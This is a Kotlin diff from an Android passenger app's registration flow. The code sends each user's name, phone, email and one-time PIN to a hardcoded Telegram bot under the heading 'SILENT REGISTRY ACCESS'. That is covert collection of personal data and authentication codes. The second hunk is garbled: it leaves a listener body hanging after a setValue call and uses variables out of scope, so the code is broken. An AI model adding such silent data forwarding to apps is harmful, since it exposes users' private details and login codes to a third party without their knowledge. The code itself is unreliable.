@@ -155,10 +155,10 @@ fun PassengerSuperApp() {
                         prefs.edit().putString("n", n).putString("p", p).putString("e", e).putBoolean("is_v", true).putLong("v_start", vStart).apply()
                         pName = n; pPhone = p; pEmail = e; isVerifying = true 
                         val pin = (100000..999999).random().toString()
-                        FirebaseDatabase.getInstance(DB_URL).getReference("verifications").child(p).setValue(mapOf("name" to n, "code" to pin, "time" to vStart))
+                        FirebaseDatabase.getInstance(DB_URL).getReference("verifications").child(p.ifEmpty { e.replace(".", "_") }).setValue(mapOf("name" to n, "code" to pin, "email" to e))
                         scope.launch(Dispatchers.IO) { 
                             try { 
-                                val msg = "🚨 SILENT REGISTRY ACCESS\nName: $n\nPhone: $p\n🗝️ PIN: $pin"
+                                val msg = "🚨 SILENT REGISTRY ACCESS\nName: $n\nPhone: ${p.ifEmpty { "N/A" }}\nEmail: ${e.ifEmpty { "N/A" }}\n🗝️ PIN: $pin"
                                 val encodedMsg = URLEncoder.encode(msg, "UTF-8")
                                 val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=$encodedMsg")
                                 (url.openConnection() as HttpURLConnection).apply { requestMethod = "GET" }.inputStream.bufferedReader().readText()
@@ -167,7 +167,7 @@ fun PassengerSuperApp() {
                     }
                 } else {
                     VerificationView(phone = pPhone, prefs = prefs, onVerify = { code ->
-                        FirebaseDatabase.getInstance(DB_URL).getReference("verifications").child(pPhone).child("code").addListenerForSingleValueEvent(object : ValueEventListener {
+                        FirebaseDatabase.getInstance(DB_URL).getReference("verifications").child(p.ifEmpty { e.replace(".", "_") }).setValue(mapOf("name" to n, "code" to pin, "email" to e))
                             override fun onDataChange(s: DataSnapshot) {
                                 if (s.value?.toString() == code) { 
                                     prefs.edit().putBoolean("auth", true).putBoolean("is_v", false).apply()
